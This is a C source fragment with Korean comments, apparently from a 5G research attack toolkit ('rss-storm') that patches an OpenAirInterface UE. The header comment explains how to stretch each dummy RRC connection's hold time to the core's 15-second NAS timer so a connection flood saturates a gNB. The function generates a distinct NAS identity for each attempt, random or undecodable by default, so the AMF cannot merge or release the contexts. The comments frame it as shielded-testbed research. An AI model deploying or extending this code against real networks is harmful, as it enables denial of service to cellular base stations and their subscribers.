/* A-NAS identity policy — staging fragment, not yet folded into rss-ue.patch.
 *
 * WHY THIS FILE EXISTS
 * A형(Msg5 생략)의 보유시간은 gNB 의 t300 + rrc_procedure_guard_time_ms 로
 * 고정이다. 실측 2,197 ms. 점유 = 수락률 x 보유시간 이고 수락률은 gNB RA
 * 파이프라인이 42.5/s 로 묶으므로 점유는 93.4 에서 멈춘다(천장 96, 체류 35.1%).
 * 천장을 고정하려면 44.6/s 가 필요해 3% 가 모자란다.
 *
 * Msg5 를 "보내면" 그 guard 타이머가 취소되고 보유시간이 코어의 NAS 타이머로
 * 넘어간다. rss-landscape.md:211 (Buckler) 는 Open5GS 기본 설정에서 더미 연결
 * 하나가 15초 뒤 만료된다고 기록한다. 15초면 천장 고정에 96/15 = 6.4/s 만
 * 필요하므로 현재 수락률에 6.6배 여유가 생긴다.
 *
 * 전제조건 하나가 남는다. 완료된 컨텍스트는 NAS 가입자 식별자로 구분되므로,
 * 모든 인스턴스가 /root/oai_nrue.conf 의 같은 IMSI 를 쓰면 AMF 가 같은 SUPI 의
 * 이전 컨텍스트를 해제한다 → 동시에 1개만 남는다. 그래서 시도마다 다른
 * identity 를 제시해야 한다. rss-theory.md:449 는 identity 정책이 "OCUDU 의
 * 수락·거절에는 영향이 없다" 고 적었는데, 그 판단은 A형(identity 가 Msg3 의
 * randomValue)에 한정된다. A-NAS 에서는 identity 가 Msg5 의 NAS 페이로드에
 * 실리므로 정책이 공격 성립의 핵심이 된다. 이 파일이 그 정정이다.
 *
 * 격리 전제: rss-storm 전체와 동일하다. 차폐 테스트베드, 팀 자체 장비만.
 */

#include <stdbool.h>
#include <stdint.h>
#include <string.h>

/* 시도마다 제시할 identity. 호출부는 이 구조체를 Msg5 의 NAS 페이로드로
   직렬화한다(등록 요청의 SUCI 또는 서비스 요청의 5G-S-TMSI). */
typedef enum {
  RSS_NAS_ID_SUCI_RANDOM = 0, /* 임의 MSIN + 우리 PLMN → UDM 조회 실패 경로 */
  RSS_NAS_ID_SUCI_CONFIGURED, /* 설정된 IMSI 그대로 → 인증 요청까지 진행 */
  RSS_NAS_ID_TMSI_RANDOM,     /* 임의 5G-S-TMSI 서비스 요청 → UDM 조회 없음 */
  RSS_NAS_ID_OPAQUE,          /* 복호 불가 NAS 옥텟 → AMF 가 조용히 폐기 */
} rss_nas_id_kind_t;

typedef struct {
  rss_nas_id_kind_t kind;
  uint8_t msin[5];  /* kind == *_SUCI_RANDOM 일 때만 의미가 있다 */
  uint64_t tmsi;    /* kind == *_TMSI_RANDOM 일 때만 의미가 있다 */
} rss_nas_id_t;

/* 노브: 위 enum 의 값. rss.conf 의 anas_id_policy 로 들어온다. */
extern int rss_anas_id_policy(void);
/* 인스턴스별 시도 순번. attempt_start 레코드의 seq 와 같은 값이다. */
extern unsigned rss_attempt_seq(int ue_id);
/* 재현성: 같은 run_id + 같은 (ue_id, seq) 는 같은 값을 돌려줘야 한다.
   분석기가 라벨을 재생할 수 있어야 하므로 rand() 를 쓰지 않는다. */
extern uint32_t rss_mix32(uint32_t a, uint32_t b);

/* 한 시도가 제시할 identity 를 고른다.
   호출: Msg5 직전, nr_rrc_process_rrcsetup() 의 NAS 페이로드 생성 경로. */
void nr_rss_anas_build_identity(int ue_id, rss_nas_id_t *out)
{
  memset(out, 0, sizeof(*out));
  const unsigned seq = rss_attempt_seq(ue_id);
  const uint32_t h = rss_mix32((uint32_t)ue_id, seq);

  /* 기본값은 OPAQUE 다. 네 kind 중 유일하게 SUPI 가 해소되지 않으므로 AMF 가
     같은 가입자의 이전 컨텍스트를 해제할 일이 없고(= 컨텍스트가 합쳐지지
     않는다), 거절할 NAS 절차 자체가 없어 보유시간이 코어 타이머에 묶이지도
     않는다. 나머지 셋은 대조군으로 남긴다 — 특히 SUCI_CONFIGURED 는 인증
     요청까지 진행되므로 보유시간 상한을 재는 데 쓴다. */
  const int pol = rss_anas_id_policy();
  out->kind = (pol >= RSS_NAS_ID_SUCI_RANDOM && pol <= RSS_NAS_ID_OPAQUE)
                  ? (rss_nas_id_kind_t)pol
                  : RSS_NAS_ID_OPAQUE;

  switch (out->kind) {
    case RSS_NAS_ID_SUCI_RANDOM:
      /* 호출부가 BCD 로 포장하므로 모든 니블을 합법적인 10진 숫자로 둔다.
         그래야 AMF 디코더가 UDM 조회까지 도달한다 — 니블이 불법이면 디코딩이
         먼저 실패해 의도치 않게 OPAQUE 와 같은 경로가 된다. */
      for (int i = 0; i < 5; i++) {
        const uint32_t d = rss_mix32(h, (uint32_t)i);
        out->msin[i] = (uint8_t)(((d % 10u) << 4) | ((d / 10u) % 10u));
      }
      break;
    case RSS_NAS_ID_TMSI_RANDOM:
      /* ng-5G-S-TMSI-Part1 은 39비트다. 0 은 "TMSI 없음" 과 구별되지 않으므로
         피한다. */
      out->tmsi = (((uint64_t)h << 7) | (h & 0x7fu)) & 0x7fffffffffULL;
      if (out->tmsi == 0)
        out->tmsi = 1;
      break;
    case RSS_NAS_ID_SUCI_CONFIGURED:
    case RSS_NAS_ID_OPAQUE:
      /* 추가 필드가 없다. CONFIGURED 는 호출부가 USIM 값을 그대로 쓰고,
         OPAQUE 는 호출부가 복호 불가 옥텟을 만든다. */
      break;
  }
}
